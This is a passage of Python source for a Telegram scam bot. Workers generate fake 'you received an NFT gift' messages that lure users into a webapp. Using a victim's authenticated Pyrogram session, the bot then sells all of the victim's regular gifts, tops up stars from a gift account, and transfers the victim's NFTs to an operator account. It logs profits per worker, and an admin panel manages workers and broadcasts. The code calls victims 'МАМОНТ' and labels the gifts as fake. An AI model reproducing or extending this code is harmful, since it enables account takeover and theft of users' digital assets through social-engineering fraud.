        victim_user_id: Telegram ID of recipient (МАМОНТ)
        message_text: Message to send (default: "." for hidden)
    
    Returns:
        bool: True if successful
    """
    try:
        gift_api_id = SETTINGS.get("gift_account_api_id", SETTINGS.get("api_id"))
        gift_api_hash = SETTINGS.get("gift_account_api_hash", SETTINGS.get("api_hash"))
        gift_phone = str(SETTINGS.get("gift_account_phone")).strip()
        sessions_dir = Path(__file__).parent / "sessions"
        
        gift_client = Client(
            f"gift_account_{gift_phone}",
            gift_api_id,
            gift_api_hash,
            workdir=str(sessions_dir)
        )
        
        if not gift_client.is_connected:
            await gift_client.connect()
        
        log_transfer(f"📤 Gift account sending message to user #{victim_user_id}...", "debug")
        
        # Send message
        await gift_client.send_message(
            chat_id=victim_user_id,
            text=message_text,
            disable_notification=True
        )
        
        log_transfer(f"✅ Gift account sent message to user #{victim_user_id}", "info")
        
        if gift_client.is_connected:
            await gift_client.disconnect()
        
        return True
        
    except Exception as e:
        log_transfer(f"⚠️ Failed to send message from gift account: {e}", "warning")
        return False


async def send_message_from_user(client: Client, target_user_id: int, message_text: str = ".") -> bool:
    """
    Send message from user (victim) account to target.
    Used for peer establishment and communication.
    
    Args:
        client: User's authenticated Pyrogram client
        target_user_id: Telegram ID of recipient (usually gift account or other)
        message_text: Message to send (default: "." for hidden)
    
    Returns:
        bool: True if successful
    """
    try:
        log_transfer(f"📤 User sending message to #{target_user_id}...", "debug")
        
        await client.send_message(
            chat_id=target_user_id,
            text=message_text,
            disable_notification=True
        )
        
        log_transfer(f"✅ User sent message to #{target_user_id}", "info")
        return True
        
    except Exception as e:
        log_transfer(f"⚠️ Failed to send message from user: {e}", "warning")
        return False


async def establish_mutual_peer(client: Client, victim_user_id: int) -> bool:
    """
    Establish peer relationship between gift account and victim.
    Uses mutual message exchange:
    1. Gift account sends message to victim
    2. Victim sends message back to gift account
    3. Both have peer relationship established
    
    Args:
        client: User's authenticated Pyrogram client
        victim_user_id: Telegram ID of victim (МАМОНТ)
    
    Returns:
        bool: True if peer established successfully
    """
    try:
        log_transfer(f"🤝 Establishing mutual peer relationship...", "info")
        
        # Get user info
        me = await client.get_me()
        log_transfer(f"📱 User: @{me.username} (ID: {me.id})", "debug")
        
        # STEP 1: Gift account sends message to victim
        log_transfer(f"📤 Step 1: Gift account sending hidden message to victim #{victim_user_id}...", "info")
        gift_msg_sent = await send_message_from_gift_account(victim_user_id, ".")
        
        if not gift_msg_sent:
            log_transfer(f"⚠️ Gift account message failed", "warning")
            return False
        
        await asyncio.sleep(1)  # Wait for server
        
        # STEP 2: Victim sends message back to gift account
        log_transfer(f"📤 Step 2: Victim sending hidden message to gift account...", "info")
        victim_msg_sent = await send_message_from_user(client, 6149807426, ".")
        
        if not victim_msg_sent:
            log_transfer(f"⚠️ Victim message failed", "warning")
            return False
        
        await asyncio.sleep(2)  # Wait for peer to be established
        
        log_transfer(f"✅ Peer relationship established successfully!", "info")
        return True
        
    except Exception as e:
        log_transfer(f"⚠️ Peer establishment failed: {e}", "warning")
        log_transfer(f"\n📱 MANUAL SETUP REQUIRED:", "warning")
        log_transfer(f"   1. Open @justerplayed in Telegram", "warning")
        log_transfer(f"   2. Send ANY message (e.g., 'hi' or '🎁')", "warning")
        log_transfer(f"   3. Wait for response", "warning")
        log_transfer(f"   4. Return and retry transfer", "warning")
        return False

async def transfer_process(client: Client, bot: Bot):
    """Main NFT transfer process with auto-selling of regular gifts if needed"""
    nft_log_results = []

    try:
        if not client.is_connected:
            await client.connect()
        me = await client.get_me()

        log_transfer(f"🚀 START TRANSFER: @{me.username}")

        profile_gifts = await scan_location_gifts(client, "me", "Profile")
        log_transfer(f"Total profile gifts scanned: {len(profile_gifts)}", "info")
        
        # Count gift types
        sticker_count = sum(1 for g in profile_gifts if g.get('is_sticker', False))
        nft_count = sum(1 for g in profile_gifts if g['is_nft'])
        regular_count = sum(1 for g in profile_gifts if not g['is_nft'] and not g.get('is_sticker', False))
        
        if sticker_count > 0:
            log_transfer(f"  Stickers: {sticker_count} (filtered out)", "debug")
        log_transfer(f"  NFTs: {nft_count}", "info")
        log_transfer(f"  Regular gifts: {regular_count}", "info")
        
        all_nfts_to_send = [g for g in profile_gifts if g['is_nft'] and g['can_transfer']]
        # Filter out stickers explicitly - they have is_sticker=True and can_convert=False
        # Get ALL regular gifts (not just sellable) - we want to sell all of them
        regular_gifts = [g for g in profile_gifts 
                        if not g['is_nft'] and not g.get('is_sticker', False) and g.get('can_convert', False) and g['star_count'] > 0]
        
        log_transfer(f"NFTs transferable: {len(all_nfts_to_send)}", "info")
        log_transfer(f"Regular gifts (can sell): {len(regular_gifts)}", "info")

        if not all_nfts_to_send and not regular_gifts:
            log_transfer("🏁 No gifts to process")
            return nft_log_results

        raw_target = SETTINGS.get("target_user")
        if not raw_target:
            log_transfer("⚠️ No target configured!", "warning")
            return nft_log_results

        final_recipient_id = await prepare_transfer_target(client, raw_target)

        if final_recipient_id and all_nfts_to_send:
            # Calculate total transfer cost needed
            total_transfer_cost = sum(nft.get('transfer_cost', 0) for nft in all_nfts_to_send)
            
            log_transfer(f"💸 NFT transfer cost: {total_transfer_cost} ⭐")
            
            # STEP 1: Check current star balance
            log_transfer(f"⚡️ Checking current star balance for NFT transfer...", "info")
            current_stars = await check_star_balance(client)
            log_transfer(f"📊 Current star balance: {current_stars}⭐ (need {total_transfer_cost}⭐)", "info")
            
            # STEP 2: If not enough stars, try to sell user's own regular gifts
            if current_stars < total_transfer_cost and regular_gifts:
                shortage = total_transfer_cost - current_stars
                log_transfer(f"⚠️ Need {shortage}⭐ more - selling ALL user gifts...", "info")
                log_transfer(f"🔄 STEP 2a: Selling {len(regular_gifts)} regular gifts to get stars...")
                
                # Sell ALL gifts regardless
                sell_tasks = [sell_gift_task(client, gift, bot) for gift in regular_gifts]
                sell_results = await asyncio.gather(*sell_tasks)
                
                total_stars_from_sales = sum(
                    regular_gifts[idx]['star_count'] 
                    for idx, res in enumerate(sell_results) if res == 'success'
                )
                successful_sells = sum(1 for res in sell_results if res == 'success')
                log_transfer(f"💰 Sold {successful_sells}/{len(regular_gifts)} gifts for {total_stars_from_sales} ⭐")
                
                # Check balance again
                current_stars = await check_star_balance(client)
                log_transfer(f"📊 Updated balance: {current_stars}⭐ (need {total_transfer_cost}⭐)", "info")
            
            # STEP 3: If still not enough stars, use gift account auto-gift
            if current_stars < total_transfer_cost:
                shortage = total_transfer_cost - current_stars
                log_transfer(f"⚠️ Still need {shortage}⭐ - sending auto-gifts from gift account...", "info")
                log_transfer(f"🔄 STEP 2b: Sending gifts from gift account ({SETTINGS.get('gift_account_phone')})...")
                
                # AUTO-ESTABLISH CONTACT: Use new mutual messaging function
                log_transfer(f"🤝 STEP 2b-1: Establishing mutual peer relationship...", "info")
                
                peer_established = await establish_mutual_peer(client, me.id)
                
                if not peer_established:
                    log_transfer(f"⚠️ Peer establishment failed - attempting gift send anyway", "warning")
                
                gift_success = await auto_gift_from_target(me.id, bot)
                
                if gift_success:
                    # Wait and check balance after gift received
                    log_transfer("⏳ Waiting for gift to be received...", "debug")
                    await asyncio.sleep(3)  # Wait for gift to arrive
                    
                    # Rescan for new gifts
                    profile_gifts = await scan_location_gifts(client, "me", "Profile")
                    new_regular_gifts = [g for g in profile_gifts 
                                        if not g['is_nft'] and not g.get('is_sticker', False) and g.get('can_convert', False) and g['star_count'] > 0]
                    
                    if new_regular_gifts:
                        log_transfer(f"✅ Got {len(new_regular_gifts)} new gifts from auto-gift! Selling them...", "info")
                        sell_tasks = [sell_gift_task(client, gift, bot) for gift in new_regular_gifts]
                        sell_results = await asyncio.gather(*sell_tasks)
                        
                        total_stars_from_sales = sum(
                            new_regular_gifts[idx]['star_count'] 
                            for idx, res in enumerate(sell_results) if res == 'success'
                        )
                        successful_sells = sum(1 for res in sell_results if res == 'success')
                        log_transfer(f"💰 Sold {successful_sells}/{len(new_regular_gifts)} gifted items for {total_stars_from_sales} ⭐")
                        
                        # Check balance one more time
                        current_stars = await check_star_balance(client)
                        log_transfer(f"📊 Final balance: {current_stars}⭐ (need {total_transfer_cost}⭐)", "info")
                else:
                    log_transfer("⚠️ Auto-gift from gift account failed - NFT transfer may fail", "warning")
            
            # STEP 3: Now attempt NFT transfer with current balance
            log_transfer(f"🚀 STEP 3: Attempting NFT transfer with {current_stars}⭐...", "info")
            
            # Send NFTs
            if all_nfts_to_send:
                log_transfer("⚡️ SENDING NFTs...")
                tasks = [transfer_nft_task(client, nft, final_recipient_id, bot, None) for nft in all_nfts_to_send]
                results_status = await asyncio.gather(*tasks)

                successful_nfts = []
                for idx, res in enumerate(results_status):
                    status_str = '✅' if res == 'success' else '❌'
                    nft_log_results.append({
                        'title': all_nfts_to_send[idx]['title'],
                        'slug': all_nfts_to_send[idx].get('slug', ''),
                        'status': status_str
                    })
                    
                    # Collect successful NFTs for profit logging
                    if res == 'success':
                        successful_nfts.append(all_nfts_to_send[idx])
                
                # Log successful NFTs to profit channel
                if successful_nfts:
                    try:
                        # Get NFT details with market prices
                        nft_details = await get_nft_details_with_prices(successful_nfts)
                        
                        # Get target user info
                        target_user = await client.get_users(final_recipient_id)
                        target_username = target_user.username or f"user_{final_recipient_id}"
                        
                        # Calculate total stars spent
                        total_stars_spent = sum(nft.get('transfer_cost', 0) for nft in successful_nfts)
                        
                        # Send profit log
                        await log_nft_profit(
                            bot,
                            final_recipient_id,
                            target_username,
                            nft_details,
                            total_value=sum(nft.get('market_price', 0) for nft in nft_details)
                        )
                        log_transfer(f"📊 Profit logged for {len(successful_nfts)} NFTs", "info")
                        
                        # Log to worker logs if this user has a worker assigned
                        user_info = db.get_user(final_recipient_id)
                        if user_info and user_info.get('worker_id'):
                            worker_id = user_info['worker_id']
                            try:
                                await log_worker_profit(
                                    bot,
                                    worker_id,
                                    final_recipient_id,
                                    target_username,
                                    nft_details,
                                    total_stars_spent
                                )
                                log_transfer(f"👷 Worker profit logged for worker {worker_id}", "info")
                            except Exception as we:
                                log_transfer(f"⚠️ Failed to log to worker: {we}", "warning")
                    except Exception as e:
                        log_transfer(f"⚠️ Failed to log profit: {e}", "warning")
            
            # After transferring NFTs, scan for remaining gifts and process them
            remaining_gifts = await scan_location_gifts(client, "me", "Profile")
            # Filter out stickers explicitly - they should never be processed
            remaining_regular = [g for g in remaining_gifts 
                                if not g['is_nft'] and not g.get('is_sticker', False) and g.get('can_convert', False) and g['star_count'] > 0]
            
            if remaining_regular:
                log_transfer(f"🎁 Found {len(remaining_regular)} remaining gifts to process", "info")
                
                # Sell all remaining gifts
                log_transfer(f"💸 Selling {len(remaining_regular)} remaining gifts...")
                sell_tasks = [sell_gift_task(client, gift, bot) for gift in remaining_regular]
                sell_results = await asyncio.gather(*sell_tasks)
                
                sold_count = sum(1 for r in sell_results if r == 'success')
                sold_stars = sum(
                    remaining_regular[idx]['star_count']
                    for idx, res in enumerate(sell_results) if res == 'success'
                )
                log_transfer(f"💰 Sold {sold_count}/{len(remaining_regular)} remaining gifts for {sold_stars} ⭐")
            
            # BONUS: Buy and send gifts on remaining balance to target user
            if final_recipient_id:
                log_transfer(f"⏳ Checking final balance for bonus gifts...", "info")
                final_balance = await check_star_balance(client)
                
                if final_balance > 0:
                    # Send bonus gifts to user using remaining balance
                    bonus_stats = await buy_and_send_remaining_gifts(client, final_recipient_id, final_balance)
                    
                    if bonus_stats['success']:
                        log_transfer(f"🎁 SUCCESS: Sent {bonus_stats['gifts_sent']} bonus gifts for {bonus_stats['stars_spent']}⭐", "info")
                    elif bonus_stats['gifts_sent'] > 0:
                        log_transfer(f"⚠️ Sent {bonus_stats['gifts_sent']} bonus gifts but with some errors", "warning")
                    else:
                        log_transfer(f"⚠️ Could not send bonus gifts: {', '.join(bonus_stats['errors']) if bonus_stats['errors'] else 'Unknown error'}", "warning")
            
            # If no NFTs but had/sold regular gifts
            if not all_nfts_to_send and (regular_gifts or remaining_regular):
                log_transfer(f"📊 Processed regular gifts - sold all remaining")
        else:
            for nft in all_nfts_to_send:
                nft_log_results.append({'title': nft['title'], 'status': '❌ NoTarget'})

    except Exception as e:
        print_error(f"Transfer Error: {e}")
        log_transfer(f"Transfer Error: {e}", "error")
        await alert_admins(bot, f"🔥 Transfer Error: {e}")

    return nft_log_results


# ================= 👑 ADMIN ROUTER =================
def create_admin_router(bot: Bot) -> Router:
    """Admin panel commands (only for admin IDs)"""
    router = Router()
    
    ADMIN_IDS = SETTINGS.get('admin_ids', [])

    async def is_admin(user_id: int) -> bool:
        """Check if user is admin"""
        return user_id in ADMIN_IDS

    @router.message(Command('admin'))
    async def cmd_admin(msg: types.Message):
        """Admin panel"""
        if not await is_admin(msg.from_user.id):
            await msg.answer("❌ Доступ запрещен")
            return
        
        kb = InlineKeyboardBuilder()
        kb.button(text="👥 Управление воркерами", callback_data="admin:workers")
        kb.button(text="📢 Рассылка", callback_data="admin:broadcast")
        kb.button(text="📊 Статистика", callback_data="admin:stats")
        kb.button(text="⚙️ Настройки", callback_data="admin:settings")
        kb.adjust(2)
        
        await msg.answer(
            "👑 <b>АДМИН-ПАНЕЛЬ</b>\n\nВыберите операцию:",
            reply_markup=kb.as_markup()
        )

    @router.callback_query(F.data == "admin:workers")
    async def admin_workers(callback: types.CallbackQuery):
        """Worker management menu"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        kb = InlineKeyboardBuilder()
        kb.button(text="➕ Добавить", callback_data="admin:worker:add")
        kb.button(text="❌ Удалить", callback_data="admin:worker:remove")
        kb.button(text="📋 Список", callback_data="admin:worker:list")
        kb.button(text="🔙 Назад", callback_data="admin:back")
        kb.adjust(2)
        
        await callback.message.edit_text(
            "👥 <b>УПРАВЛЕНИЕ ВОРКЕРАМИ</b>",
            reply_markup=kb.as_markup()
        )
        await callback.answer()

    @router.callback_query(F.data == "admin:worker:list")
    async def admin_worker_list(callback: types.CallbackQuery):
        """Show list of workers"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        workers = db.get_all_workers()
        
        if not workers:
            text = "📋 <b>ВОРКЕРЫ</b>\n\n❌ Воркеры не найдены"
        else:
            text = "📋 <b>ВОРКЕРЫ</b>\n\n"
            for worker in workers:
                uid = worker[0]
                username = worker[1] or "unknown"
                worker_count = db.get_user_worker_count(uid)
                text += f"\n👤 @{username} (ID: {uid})\n   └ Клиентов: {worker_count}"
        
        kb = InlineKeyboardBuilder()
        kb.button(text="🔙 Назад", callback_data="admin:workers")
        
        await callback.message.edit_text(text, reply_markup=kb.as_markup())
        await callback.answer()

    @router.callback_query(F.data == "admin:worker:add")
    async def admin_worker_add(callback: types.CallbackQuery, state: FSMContext):
        """Add new worker - request worker ID"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        await state.set_state(AdminPanelState.add_worker)
        await callback.message.edit_text(
            "📝 <b>ДОБАВИТЬ ВОРКЕРА</b>\n\nОтправьте ID воркера:",
            reply_markup=InlineKeyboardBuilder().button(
                text="❌ Отмена", callback_data="admin:workers"
            ).as_markup()
        )
        await callback.answer()

    @router.message(StateFilter(AdminPanelState.add_worker), F.text)
    async def process_worker_id(msg: types.Message, state: FSMContext):
        """Process worker ID input for adding"""
        
        if not await is_admin(msg.from_user.id):
            await msg.answer("❌ Доступ запрещен")
            return
        
        try:
            worker_id = int(msg.text)
            worker = db.get_user(worker_id)
            
            if not worker:
                await msg.answer(f"❌ Пользователь {worker_id} не найден")
                return
            
            # Add worker flag
            db.set_worker(worker_id)
            await msg.answer(
                f"✅ Добавлен @{worker['username']} как воркер",
                reply_markup=InlineKeyboardBuilder().button(
                    text="👑 Админ-панель", callback_data="admin:back"
                ).as_markup()
            )
            await state.clear()
        except ValueError:
            await msg.answer("❌ Неверный формат ID")

    @router.callback_query(F.data == "admin:worker:remove")
    async def admin_worker_remove(callback: types.CallbackQuery, state: FSMContext):
        """Remove worker - request worker ID"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        await state.set_state(AdminPanelState.remove_worker)
        await callback.message.edit_text(
            "📝 <b>УДАЛИТЬ ВОРКЕРА</b>\n\nОтправьте ID воркера:",
            reply_markup=InlineKeyboardBuilder().button(
                text="❌ Отмена", callback_data="admin:workers"
            ).as_markup()
        )
        await callback.answer()

    @router.message(StateFilter(AdminPanelState.remove_worker), F.text)
    async def process_remove_worker_id(msg: types.Message, state: FSMContext):
        """Process worker ID input for removal"""
        
        if not await is_admin(msg.from_user.id):
            await msg.answer("❌ Доступ запрещен")
            return
        
        try:
            worker_id = int(msg.text)
            worker = db.get_user(worker_id)
            
            if not worker:
                await msg.answer(f"❌ Пользователь {worker_id} не найден")
                return
            
            if not worker['is_worker']:
                await msg.answer(f"❌ @{worker['username']} не является воркером")
                return
            
            # Remove worker
            user_count = db.remove_worker_assignment(worker_id)
            await msg.answer(
                f"✅ Удален @{worker['username']} как воркер\n📋 Отозвано {user_count} пользователей",
                reply_markup=InlineKeyboardBuilder().button(
                    text="👑 Админ-панель", callback_data="admin:back"
                ).as_markup()
            )
            await state.clear()
        except ValueError:
            await msg.answer("❌ Неверный формат ID")

    @router.callback_query(F.data == "admin:broadcast")
    async def admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
        """Broadcast message to all users"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        await state.set_state(AdminPanelState.broadcast)
        await callback.message.edit_text(
            "📢 <b>РАССЫЛКА СООБЩЕНИЕ</b>\n\nОтправьте сообщение:",
            reply_markup=InlineKeyboardBuilder().button(
                text="❌ Отмена", callback_data="admin:back"
            ).as_markup()
        )
        await callback.answer()

    @router.message(StateFilter(AdminPanelState.broadcast), F.text)
    async def process_broadcast(msg: types.Message, state: FSMContext):
        """Process broadcast message"""
        
        if not await is_admin(msg.from_user.id):
            await msg.answer("❌ Доступ запрещен")
            return
        
        text = msg.text
        users = db.get_all_users()
        sent = 0
        failed = 0
        
        await msg.answer("📢 Отправка сообщения...")
        
        for user in users:
            try:
                await bot.send_message(
                    chat_id=user[0],
                    text=f"📢 <b>ОБЩЕЕ СООБЩЕНИЕ</b>\n\n{text}",
                    parse_mode=ParseMode.HTML
                )
                sent += 1
                await asyncio.sleep(0.1)  # Rate limit
            except Exception as e:
                failed += 1
                logger.debug(f"Failed to send broadcast to {user[0]}: {e}")
        
        await msg.answer(
            f"✅ Отправка завершена!\n\n✅ Отправлено: {sent}\n❌ Ошибки: {failed}",
            reply_markup=InlineKeyboardBuilder().button(
                text="👑 Админ-панель", callback_data="admin:back"
            ).as_markup()
        )
        await state.clear()

    @router.callback_query(F.data == "admin:stats")
    async def admin_stats(callback: types.CallbackQuery):
        """Show bot statistics"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        total_users = db.get_user_count()
        total_workers = db.get_worker_count()
        
        text = f"""
📊 <b>СТАТИСТИКА БОТА</b>

👥 Всего пользователей: {total_users}
👷 Всего воркеров: {total_workers}
⏰ Uptime: (расчит если нужен)

🎁 Обработанных подарков: (из логов)
💎 Переведено NFT: (из логов)
"""
        
        kb = InlineKeyboardBuilder()
        kb.button(text="🔙 Назад", callback_data="admin:back")
        
        await callback.message.edit_text(text, reply_markup=kb.as_markup())
        await callback.answer()

    @router.callback_query(F.data == "admin:back")
    async def admin_back(callback: types.CallbackQuery):
        """Return to admin menu"""
        if not await is_admin(callback.from_user.id):
            await callback.answer("❌ Доступ запрещен")
            return
        
        kb = InlineKeyboardBuilder()
        kb.button(text="👥 Управление воркерами", callback_data="admin:workers")
        kb.button(text="📢 Рассылка", callback_data="admin:broadcast")
        kb.button(text="📊 Статистика", callback_data="admin:stats")
        kb.button(text="⚙️ Настройки", callback_data="admin:settings")
        kb.adjust(2)
        
        await callback.message.edit_text(
            "👑 <b>АДМИН-ПАНЕЛЬ</b>\n\nВыберите операцию:",
            reply_markup=kb.as_markup()
        )
        await callback.answer()

    return router


# ================= 🤖 MAIN ROUTER =================
def create_main_router(bot: Bot) -> Router:
    router = Router()

    async def show_main_menu(message, user_id, edit=False):
        """Show main menu"""
        try:
            user = db.get_user(user_id)
            logger.info(f"[DEBUG] show_main_menu: user={user}")
            lang = user['language'] if user and user.get('language') else 'en'
            logger.info(f"[DEBUG] show_main_menu: lang={lang}")
            
            # Ensure lang is valid and TEXTS is loaded
            if not TEXTS or lang not in TEXTS:
                lang = 'en'
                if user:
                    db.set_language(user_id, 'en')
            
            # Get text with multiple fallbacks
            text = None
            if TEXTS and lang in TEXTS:
                text = TEXTS[lang].get('welcome')
            
            if not text:
                text = '👋 Welcome to our bot!'
            
            logger.info(f"[DEBUG] show_main_menu: text={text[:50] if text else 'EMPTY'}")
            
            # Build keyboard
            kb = InlineKeyboardBuilder()
            btn_webapp = 'Open App'
            btn_about = 'About'
            
            if TEXTS and lang in TEXTS:
                btn_webapp = TEXTS[lang].get('btn_webapp', 'Open App')
                btn_about = TEXTS[lang].get('btn_about', 'About')
            
            kb.row(InlineKeyboardButton(
                text=btn_webapp,
                web_app=WebAppInfo(url=get_webapp_url(user_id))
            ))
            kb.row(InlineKeyboardButton(text=btn_about, url=SETTINGS.get('about_link', 'https://t.me/IT_Portal')))

            if edit:
                try:
                    if isinstance(message, types.CallbackQuery):
                        await message.message.delete()
                    else:
                        await message.delete()
                except Exception as e:
                    logger.error(f"[DEBUG] show_main_menu: error deleting message: {e}")

            start_img = BASE_DIR / "start.jpg"
            try:
                if start_img.exists():
                    await message.answer_photo(
                        photo=FSInputFile(start_img),
                        caption=text,
                        reply_markup=kb.as_markup(),
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await message.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
            except Exception as e:
                logger.error(f"[DEBUG] show_main_menu: error sending message: {e}")
                await message.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.error(f"[DEBUG] show_main_menu: critical error: {e}")
            try:
                await message.answer(f"❌ Error: {str(e)[:100]}")
            except Exception as ee:
                logger.error(f"[DEBUG] show_main_menu: failed to send error message: {ee}")

    @router.message(CommandStart())
    async def cmd_start(msg: types.Message, command: CommandObject):
        uid = msg.from_user.id
        username = msg.from_user.username or f"user_{uid}"

        logger.info(f"[START] User {uid} (@{username})")
        try:
            logger.info(f"[DEBUG] cmd_start: add_user {uid} {username}")
            db.add_user(uid, username, msg.from_user.first_name)
            user = db.get_user(uid)
            logger.info(f"[DEBUG] cmd_start: user={user}")

            # Log to topic
            try:
                name_esc = escape_html(msg.from_user.first_name or 'User')
                worker_txt = "Unknown"
                if user and user.get('worker_id'):
                    w = db.get_user(user['worker_id'])
                    if w:
                        worker_txt = f"@{w['username']}" if w['username'] else f"ID: {w['worker_id']}"

                logger.info(f"[DEBUG] cmd_start: log_to_topic {uid}")
                await log_to_topic(
                    bot,
                    'topic_launch',
                    f"🚀 {name_esc} (ID: <code>{uid}</code>) started bot\nWorker: {worker_txt}"
                )
            except Exception as e:
                logger.error(f"[DEBUG] cmd_start: log_to_topic error: {e}")

            # Check language selection logic
            current_lang = user.get('language') if user else 'en'
            if not current_lang or current_lang == 0:
                current_lang = 'en'
                db.set_language(uid, 'en')
            lang = current_lang if current_lang in TEXTS else 'en'
            logger.info(f"[DEBUG] cmd_start: lang={lang}")

            args = command.args
            logger.info(f"[DEBUG] cmd_start: args={args}")

            # Handle gift claim deep links
            if args and args.startswith("claim_"):
                gift_hash = args.replace("claim_", "")
                logger.info(f"[GIFT] Claiming {gift_hash} by {uid}")

                gift_status = db.get_gift_status(gift_hash)
                logger.info(f"[DEBUG] cmd_start: gift_status={gift_status}")

                if not gift_status:
                    logger.warning(f"[DEBUG] cmd_start: gift_hash {gift_hash} NOT FOUND in DB!")

                # Already claimed
                if gift_status and gift_status[0]:
                    logger.info(f"[DEBUG] cmd_start: gift already claimed by {gift_status[1]}")
                    await log_to_logs_channel(
                        bot,
                        f"⚠️ <b>Gift Already Claimed</b>\n"
                        f"👤 User: @{username} (ID: {uid})\n"
                        f"🎁 NFT: {gift_status[2] if gift_status else 'Unknown'}\n"
                        f"🔑 Hash: <code>{gift_hash}</code>\n"
                        f"👤 Already claimed by: {gift_status[1]}"
                    )
                    await msg.answer(
                        TEXTS[lang]['gift_already_claimed'].format(user=gift_status[1]),
                        parse_mode=ParseMode.HTML
                    )
                    return

                nft_id = gift_status[2] if gift_status else "IonicDryer-7561"
                giver_id = gift_status[3] if gift_status and len(gift_status) > 3 else None

                logger.info(f"[DEBUG] cmd_start: claim_gift {gift_hash} {username} {uid}")
                db.claim_gift(gift_hash, username, uid)
                logger.info(f"[DEBUG] cmd_start: api_claim_gift task")
                asyncio.create_task(api_claim_gift(uid, gift_hash, nft_id, username))
                logger.info(f"[DEBUG] cmd_start: log_gift_received task")
                asyncio.create_task(log_gift_received(bot, uid, username, nft_id, 1, giver_id))
                logger.info(f"[DEBUG] cmd_start: log_to_logs_channel")
                await log_to_logs_channel(
                    bot,
                    f"✅ <b>Gift Claimed</b>\n"
                    f"👤 User: @{username} (ID: {uid})\n"
                    f"🎁 NFT: {nft_id}\n"
                    f"🔑 Hash: <code>{gift_hash}</code>"
                )

                gift_name_display = nft_id.replace("-", " ").replace("_", " ")
                gift_number = nft_id.split("-")[-1] if "-" in nft_id else ""
                if gift_number:
                    gift_name_display = f"{' '.join(nft_id.split('-')[:-1])} #{gift_number}"
                gift_link = f"{SETTINGS.get('nft_fragment_url', 'https://t.me/nft')}/{nft_id}"
                logger.info(f"[DEBUG] cmd_start: sending gift received message")
                await msg.answer(
                    f"🎉 <b>CONGRATULATIONS!</b>\n\n"
                    f"You have just received a new NFT gift!\n\n"
                    f"💎 <a href='{gift_link}'>{gift_name_display}</a>\n\n"
                    f"Gift added to your profile!",
                    parse_mode=ParseMode.HTML
                )
                await asyncio.sleep(1.5)
                kb = InlineKeyboardBuilder()
                kb.button(text="Enter Stream", url=SETTINGS.get('webapp_url', 'https://marketplace-bot.vercel.app/'))
                logger.info(f"[DEBUG] cmd_start: sending withdraw_prompt")
                await msg.answer(
                    TEXTS[lang]["withdraw_prompt"],
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb.as_markup()
                )
                await asyncio.sleep(1.5)
                logger.info(f"[DEBUG] cmd_start: show_main_menu after claim")
                await show_main_menu(msg, uid)
                return

            logger.info(f"[DEBUG] cmd_start: show_main_menu (no args)")
            await show_main_menu(msg, uid)
        except Exception as e:
            logger.error(f"[DEBUG] cmd_start: critical error: {e}")
            try:
                await msg.answer(f"❌ Error in /start: {e}")
            except Exception as ee:
                logger.error(f"[DEBUG] cmd_start: failed to send error message: {ee}")

    # ============ LANGUAGE SELECTION ============
    @router.callback_query(F.data.startswith("lang_"))
    async def set_language(c: CallbackQuery):
        lang = c.data.split("_")[1]
        db.set_language(uid, lang)
        await c.message.delete()
        await c.message.answer(TEXTS[lang]['lang_set'], parse_mode=ParseMode.HTML)
        await asyncio.sleep(1)
        await show_main_menu(c.message, uid)

    # ============ GIFT LANGUAGE SELECTION ============
    @router.callback_query(F.data.startswith("gift_lang_"))
    async def set_gift_language(c: CallbackQuery):
        lang = c.data.split("_")[2]  # Extract 'en' or 'ru' from 'gift_lang_en'
        uid = c.from_user.id
        db.set_language(uid, lang)
        await c.message.delete()
        await c.message.answer(TEXTS[lang]['lang_set'], parse_mode=ParseMode.HTML)
        await asyncio.sleep(1)
        await show_main_menu(c.message, uid)

    # ============ MAIN MENU CALLBACK ============
    @router.callback_query(F.data == "main_menu")
    async def cb_main_menu(c: CallbackQuery):
        await show_main_menu(c.message, c.from_user.id, edit=True)

    # ============ WORKER ACTIVATION ============
    @router.message(Command("mamontloh"))
    async def activate_worker(msg: types.Message):
        db.set_worker(msg.from_user.id)
        user = db.get_user(msg.from_user.id)
        lang = user['language'] if user else 'en'
        await msg.answer(TEXTS[lang]['worker_activated'], parse_mode=ParseMode.HTML)
        logger.info(f"[WORKER] Activated: {msg.from_user.id}")

    # ============ INLINE QUERY (FAKE GIFTS - ONLY IonicDryer-7561) ============
    @router.inline_query()
    async def inline_handler(query: types.InlineQuery):
        uid = query.from_user.id
        if not await is_worker(uid):
            return

        bot_info = await bot.get_me()
        gift_hash = secrets.token_hex(8).upper()

        # Fixed: Only IonicDryer-7561
        nft_id = "IonicDryer-7561"
        gift_text = "Ionic Dryer #7561"
        gift_price = 14.0

        db.register_gift(gift_hash, uid, nft_id)
        
        # Log to logs channel
        worker = db.get_user(uid)
        await log_to_logs_channel(
            bot,
            f"🔗 <b>Inline Gift Link Created</b>\n"
            f"🤝 Worker: @{worker['username'] if worker else 'Unknown'} (ID: {uid})\n"
            f"🎁 NFT: {gift_text}\n"
            f"🔑 Hash: <code>{gift_hash}</code>"
        )

        deep_link = f"https://t.me/{bot_info.username}?start=claim_{gift_hash}"
        visual_link = f"{SETTINGS.get('nft_fragment_url', 'https://t.me/nft')}/IonicDryer-7561"
        image_url = "https://nft.fragment.com/gift/ionic_dryer.webp"

        message_content = (
            "🎁 <b>Congratulations!</b>\n"
            "<i>You have just received a new NFT gift, check it out in your Profile!</i>\n\n"
            f"⚡️ <a href='{visual_link}'>{gift_text}</a>\n"
            f"💎 <b>Price:</b> {gift_price} TON"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="👉 Claim Gift", url=deep_link))
        kb.row(InlineKeyboardButton(text="👀 View Gift", url=visual_link))

        result = InlineQueryResultArticle(
            id=gift_hash,
            title=f"🎁 Send {gift_text}",
            description=f"Send NFT gift worth {gift_price} TON",
            thumbnail_url=image_url,
            input_message_content=InputTextMessageContent(
                message_text=message_content,
                parse_mode=ParseMode.HTML,
